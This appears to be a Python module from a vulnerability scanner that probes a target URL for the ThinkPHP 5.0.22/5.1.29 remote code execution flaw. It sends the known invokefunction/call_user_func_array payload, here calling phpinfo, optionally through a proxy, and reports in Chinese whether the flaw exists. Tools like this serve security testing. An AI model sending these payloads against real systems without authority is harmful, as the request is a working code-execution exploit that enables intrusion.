import requests
import time
from bs4 import BeautifulSoup
import re
import logging

cf=''
g='[-]'
http = ''
https = ''
def dl11(dl):
    global http,https
    http=dl
    https=dl
def a(ca,s_cookie):
    global cf
    global g
    global http, https
    cfa=[r'public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
         r'index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1']
    try:
        proxies = {'http': http,
                   'https': https}
        for i in cfa:
            if g=='[+]':
                break
            else:
                logging.captureWarnings(True)
                aa = requests.get(ca + i,cookies=s_cookie,proxies=proxies,verify=False,timeout=5)
                aa.encoding = 'utf-8'
                cd = BeautifulSoup(aa.text, 'html.parser')
                if 'System' in cd.text:
                    g = '[+]'
                    cf = '[+]漏洞存在\n'+i
        if g=='[-]':
            cf='[-]漏洞不存在'
        else:
            g='[-]'
    except EnvironmentError as aaa1:
        cf='[-]链接错误\n'+str(aaa1)
def jg6():
    global cf
    return '--------------------------------------------------\n[ ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞 ]\n\n' + str(cf) + '\n'
def u5(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)